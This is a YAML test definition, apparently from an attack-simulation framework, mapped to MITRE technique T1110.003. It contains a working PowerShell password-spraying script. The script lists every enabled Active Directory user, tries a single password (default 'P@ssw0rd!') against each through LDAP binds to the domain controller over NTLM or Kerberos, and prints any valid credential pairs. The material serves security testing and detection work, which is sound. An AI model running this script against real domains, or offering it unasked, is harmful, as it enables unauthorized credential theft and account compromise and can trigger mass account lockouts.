api_version: "2.0"
name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)
description: |
    Attempt to brute force all Active Directory domain users with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos

    Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
args:
    - name: password
      type: string
      default: P@ssw0rd!
    - name: domain
      type: string
      default: $env:UserDnsDomain
    - name: auth
      type: string
      default: NTLM
uuid: f14d956a-5b6e-4a93-847f-0c415142f07d
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.003: Password Spraying'
requirements:
    platforms:
        - os: windows
steps:
    - name: password-spray-all-active-directory-domain-users-with-a-single-password-via-ldap-against-domain-controller-(ntlm-or-kerberos)
      inline: |
        if ("{{.Args.auth}}".ToLower() -NotIn @("ntlm","kerberos")) {
          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
          exit 1
        }

        $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server {{.Args.domain}} | Select-Object -ExpandProperty SamAccountName

        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("{{.Args.domain}}",389)

        $DomainUsers | Foreach-Object {
          $user = $_
          $password = '{{.Args.password}}'

          $credz = new-object System.Net.NetworkCredential($user, $password, "{{.Args.domain}}")
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::{{.Args.auth}})
          try {
            Write-Host " [-] Attempting ${password} on account ${user}."
            $conn.bind()
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] ${user}:${password} are valid credentials!"
          } catch {
            Write-Host $_.Exception.Message
          }
        }
        Write-Host "End of password spraying"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
